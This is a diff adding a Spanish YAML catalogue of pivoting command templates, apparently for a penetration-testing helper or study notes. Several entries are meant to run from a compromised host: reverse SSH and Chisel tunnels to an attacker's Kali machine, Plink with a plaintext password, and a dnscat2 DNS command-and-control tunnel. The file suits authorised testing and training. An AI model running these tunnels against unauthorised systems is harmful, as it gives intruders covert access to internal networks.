@@ -1,0 +1,329 @@
+tools:
+  - id: ssh_local_pf
+    name: "SSH - Local Port Forwarding (-L)"
+    description: "Redirige tráfico de un puerto local al objetivo a través de SSH (acceder a servicios internos)"
+    command: "ssh -N -L {local_port}:{target_host}:{target_port} {ssh_user}@{ssh_host}"
+    params:
+      - name: local_port
+        label: "Puerto local a abrir"
+        placeholder: "8080"
+        required: true
+      - name: target_host
+        label: "Host destino interno"
+        placeholder: "10.4.50.215"
+        required: true
+      - name: target_port
+        label: "Puerto destino"
+        placeholder: "80"
+        required: true
+      - name: ssh_user
+        label: "Usuario SSH del pivot"
+        placeholder: "user"
+        required: true
+      - name: ssh_host
+        label: "IP del host pivot (con SSH)"
+        placeholder: "192.168.50.63"
+        required: true
+    tags: [pivoting, ssh, port-forwarding, local]
+    notes: "-N evita abrir shell. Después conectar a 127.0.0.1:{local_port}. Ejemplo: curl http://127.0.0.1:8080"
+
+  - id: ssh_dynamic_pf
+    name: "SSH - Dynamic Port Forwarding / SOCKS Proxy (-D)"
+    description: "Crea un proxy SOCKS5 local que tuneliza todo el tráfico a través del host pivot"
+    command: "ssh -N -D {socks_port} {ssh_user}@{ssh_host}"
+    params:
+      - name: socks_port
+        label: "Puerto SOCKS local"
+        placeholder: "9050"
+        default: "9050"
+        required: true
+      - name: ssh_user
+        label: "Usuario SSH del pivot"
+        placeholder: "user"
+        required: true
+      - name: ssh_host
+        label: "IP del host pivot"
+        placeholder: "192.168.50.63"
+        required: true
+    tags: [pivoting, ssh, socks, proxy, dynamic]
+    notes: "Configurar proxychains: echo 'socks5 127.0.0.1 9050' >> /etc/proxychains4.conf. Luego: proxychains nmap ..."
+
+  - id: ssh_remote_pf
+    name: "SSH - Remote Port Forwarding (-R)"
+    description: "Desde el objetivo comprometido, redirige un puerto del atacante hacia un servicio interno"
+    command: "ssh -N -R {kali_port}:{internal_host}:{internal_port} kali@{kali_ip}"
+    params:
+      - name: kali_port
+        label: "Puerto a abrir en Kali"
+        placeholder: "2345"
+        required: true
+      - name: internal_host
+        label: "Host interno destino"
+        placeholder: "10.4.50.215"
+        required: true
+      - name: internal_port
+        label: "Puerto del servicio interno"
+        placeholder: "5432"
+        required: true
+      - name: kali_ip
+        label: "IP de Kali (atacante)"
+        placeholder: "192.168.118.4"
+        required: true
+    tags: [pivoting, ssh, remote-forwarding, reverse]
+    notes: "Ejecutar en el host comprometido. Kali necesita SSH server activo: sudo systemctl start ssh"
+
+  - id: ssh_remote_dynamic
+    name: "SSH - Remote Dynamic Port Forwarding (SOCKS en Kali)"
+    description: "Crea proxy SOCKS en Kali iniciando la conexión SSH desde el objetivo (útil con firewalls de entrada)"
+    command: "ssh -N -R {socks_port} kali@{kali_ip}"
+    params:
+      - name: socks_port
+        label: "Puerto SOCKS a abrir en Kali"
+        placeholder: "9998"
+        required: true
+      - name: kali_ip
+        label: "IP de Kali (atacante)"
+        placeholder: "192.168.118.4"
+        required: true
+    tags: [pivoting, ssh, remote-dynamic, socks, reverse]
+    notes: "Requiere OpenSSH >= 7.6 en el cliente. Configurar proxychains en Kali con el puerto especificado."
+
+  - id: sshuttle
+    name: "sshuttle - VPN sobre SSH"
+    description: "Crea una 'VPN' transparente a través de SSH que redirige subredes internas. No requiere config de proxychains."
+    command: "sshuttle -r {ssh_user}@{ssh_host}:{ssh_port} {subnet1} {subnet2}"
+    params:
+      - name: ssh_user
+        label: "Usuario SSH"
+        placeholder: "database_admin"
+        required: true
+      - name: ssh_host
+        label: "IP del host pivot"
+        placeholder: "192.168.50.63"
+        required: true
+      - name: ssh_port
+        label: "Puerto SSH (o del pivot)"
+        placeholder: "22"
+        default: "22"
+      - name: subnet1
+        label: "Subred interna 1"
+        placeholder: "10.4.50.0/24"
+        required: true
+      - name: subnet2
+        label: "Subred interna 2 (opcional)"
+        placeholder: "172.16.50.0/24"
+    tags: [pivoting, sshuttle, vpn, transparent, routing]
+    notes: "Requiere root en Kali y Python3 en el servidor SSH. Acceso transparente sin proxychains."
+
+  - id: proxychains_config
+    name: "Proxychains - Configurar SOCKS"
+    description: "Configura proxychains para usar un proxy SOCKS local (completar después de SSH -D o Chisel)"
+    command: "echo 'socks5 127.0.0.1 {port}' >> /etc/proxychains4.conf"
+    params:
+      - name: port
+        label: "Puerto del proxy SOCKS"
+        placeholder: "9050"
+        required: true
+    tags: [pivoting, proxychains, socks, config]
+    notes: "Verificar que solo haya una entrada activa al final del fichero. Luego usar: proxychains <comando>"
+
+  - id: proxychains_nmap
+    name: "Proxychains + Nmap (TCP Connect)"
+    description: "Escaneo de puertos a través de SOCKS proxy. Solo TCP Connect (-sT), no SYN scan."
+    command: "proxychains nmap -sT -Pn -n --top-ports 20 {target}"
+    params:
+      - name: target
+        label: "Target IP"
+        placeholder: "10.4.50.64"
+        required: true
+    tags: [pivoting, proxychains, nmap, scan]
+    notes: "Más lento que un scan directo. Usar --top-ports para reducir el tiempo. No funciona con -sS (RAW sockets)."
+
+  - id: socat_port_redirect
+    name: "Socat - Redirección de Puerto"
+    description: "Redirige tráfico TCP de un puerto local a otro host:puerto (pivot simple sin SSH)"
+    command: "socat TCP-LISTEN:{local_port},fork TCP:{remote_host}:{remote_port}"
+    params:
+      - name: local_port
+        label: "Puerto local de escucha"
+        placeholder: "2222"
+        required: true
+      - name: remote_host
+        label: "Host remoto destino"
+        placeholder: "10.4.50.215"
+        required: true
+      - name: remote_port
+        label: "Puerto remoto destino"
+        placeholder: "22"
+        required: true
+    tags: [pivoting, socat, port-redirect, simple]
+    notes: "Útil en hosts sin SSH. 'fork' permite múltiples conexiones simultáneas."
+
+  - id: chisel_server
+    name: "Chisel - Servidor (Kali)"
+    description: "Inicia Chisel en modo servidor en Kali para recibir conexiones de clientes y crear túneles HTTP"
+    command: "chisel server --port {port} --reverse"
+    params:
+      - name: port
+        label: "Puerto de escucha del servidor"
+        placeholder: "8080"
+        default: "8080"
+        required: true
+    tags: [pivoting, chisel, http-tunnel, server]
+    notes: "Instalar: apt install chisel. El cliente se conecta desde el objetivo a este servidor."
+
+  - id: chisel_client_socks
+    name: "Chisel - Cliente SOCKS (Objetivo → Kali)"
+    description: "Conecta al servidor Chisel en Kali y crea un proxy SOCKS5 para acceder a la red interna"
+    command: "./chisel client {kali_ip}:{kali_port} R:socks"
+    params:
+      - name: kali_ip
+        label: "IP de Kali (servidor Chisel)"
+        placeholder: "192.168.118.4"
+        required: true
+      - name: kali_port
+        label: "Puerto del servidor Chisel"
+        placeholder: "8080"
+        default: "8080"
+        required: true
+    tags: [pivoting, chisel, http-tunnel, socks, client]
+    notes: "Ejecutar en el objetivo. Chisel abre el SOCKS proxy en Kali en el puerto por defecto 1080. Configurar proxychains."
+
+  - id: chisel_client_forward
+    name: "Chisel - Cliente Port Forward (Objetivo → Kali)"
+    description: "Crea un port forward específico a través del túnel Chisel HTTP"
+    command: "./chisel client {kali_ip}:{kali_port} R:{kali_local_port}:{internal_host}:{internal_port}"
+    params:
+      - name: kali_ip
+        label: "IP de Kali"
+        placeholder: "192.168.118.4"
+        required: true
+      - name: kali_port
+        label: "Puerto servidor Chisel"
+        placeholder: "8080"
+        default: "8080"
+        required: true
+      - name: kali_local_port
+        label: "Puerto a abrir en Kali"
+        placeholder: "3306"
+        required: true
+      - name: internal_host
+        label: "Host interno destino"
+        placeholder: "10.4.50.215"
+        required: true
+      - name: internal_port
+        label: "Puerto interno"
+        placeholder: "3306"
+        required: true
+    tags: [pivoting, chisel, http-tunnel, port-forward]
+
+  - id: plink_remote_fwd
+    name: "Plink - Remote Port Forward (Windows → Kali)"
+    description: "Port forward inverso desde Windows usando Plink (PuTTY) cuando no hay OpenSSH"
+    command: "cmd.exe /c echo y | C:\\Windows\\Temp\\plink.exe -ssh -l kali -pw {kali_pass} -R 127.0.0.1:{kali_port}:127.0.0.1:{local_port} {kali_ip}"
+    params:
+      - name: kali_ip
+        label: "IP de Kali"
+        placeholder: "192.168.118.4"
+        required: true
+      - name: kali_port
+        label: "Puerto a abrir en Kali"
+        placeholder: "9833"
+        required: true
+      - name: local_port
+        label: "Puerto local del objetivo (ej: 3389 RDP)"
+        placeholder: "3389"
+        required: true
+      - name: kali_pass
+        label: "Contraseña SSH de Kali"
+        placeholder: "kali"
+        required: true
+    tags: [pivoting, plink, windows, remote-forwarding, putty]
+    notes: "Descargar plink.exe: cp /usr/share/windows-resources/binaries/plink.exe . (en Kali). El 'echo y' acepta la huella del host automáticamente."
+
+  - id: netsh_portproxy
+    name: "Netsh - portproxy (Windows, Admin)"
+    description: "Crea un port forward nativo en Windows con Netsh (requiere privilegios de administrador)"
+    command: "netsh interface portproxy add v4tov4 listenport={listen_port} listenaddress={listen_ip} connectport={connect_port} connectaddress={connect_host}"
+    params:
+      - name: listen_port
+        label: "Puerto de escucha en Windows"
+        placeholder: "2222"
+        required: true
+      - name: listen_ip
+        label: "IP de la interfaz a escuchar"
+        placeholder: "192.168.50.64"
+        required: true
+      - name: connect_port
+        label: "Puerto destino"
+        placeholder: "22"
+        required: true
+      - name: connect_host
+        label: "Host destino"
+        placeholder: "10.4.50.215"
+        required: true
+    tags: [pivoting, netsh, windows, portproxy, admin]
+    notes: "Ver forwards: netsh interface portproxy show all. Eliminar: netsh interface portproxy delete v4tov4 listenport=<port> listenaddress=<ip>"
+
+  - id: netsh_firewall_open
+    name: "Netsh - Abrir Puerto en Firewall Windows"
+    description: "Añade regla al firewall de Windows para permitir conexiones entrantes (necesario con netsh portproxy)"
+    command: "netsh advfirewall firewall add rule name=\"{rule_name}\" protocol=TCP dir=in localip={local_ip} localport={port} action=allow"
+    params:
+      - name: rule_name
+        label: "Nombre de la regla (usar para borrarla después)"
+        placeholder: "port_forward_ssh_2222"
+        required: true
+      - name: local_ip
+        label: "IP local de la interfaz"
+        placeholder: "192.168.50.64"
+        required: true
+      - name: port
+        label: "Puerto a abrir"
+        placeholder: "2222"
+        required: true
+    tags: [pivoting, netsh, firewall, windows, admin]
+    notes: "IMPORTANTE: Borrar la regla al terminar: netsh advfirewall firewall delete rule name='<rule_name>'"
+
+  - id: xfreerdp_connect
+    name: "xFreeRDP - Conectar RDP"
+    description: "Conecta a un servicio RDP desde Linux/Kali"
+    command: "xfreerdp /u:{user} /p:{password} /v:{target}:{port} /cert-ignore"
+    params:
+      - name: target
+        label: "Target IP o localhost"
+        placeholder: "192.168.50.64"
+        required: true
+      - name: port
+        label: "Puerto RDP"
+        placeholder: "3389"
+        default: "3389"
+      - name: user
+        label: "Usuario"
+        placeholder: "administrator"
+        required: true
+      - name: password
+        label: "Contraseña"
+        placeholder: "P@ssw0rd!"
+        required: true
+    tags: [rdp, xfreerdp, remote-access, pivoting]
+
+  - id: dnscat2_server
+    name: "DNScat2 - Servidor DNS (Kali)"
+    description: "Túnel de C2 sobre DNS. Iniciar servidor en Kali (necesita control del dominio DNS)"
+    command: "dnscat2-server {domain}"
+    params:
+      - name: domain
+        label: "Dominio controlado (con servidor NS apuntando a Kali)"
+        placeholder: "feline.corp"
+        required: true
+    tags: [pivoting, dnscat2, dns-tunnel, c2]
+    notes: "El cliente en el objetivo: ./dnscat <domain>. Luego: window -i 1 → listen 127.0.0.1:4455 <internal_host>:445"
+
+  - id: check_open_ports
+    name: "Linux - Ver Puertos y Conexiones Activas (ss)"
+    description: "Lista puertos en escucha y conexiones establecidas para verificar forwards y pivots"
+    command: "sudo ss -ntplu"
+    params: []
+    tags: [pivoting, network, ports, ss, verification]
+    notes: "Usar después de crear port forwards para verificar que están activos."
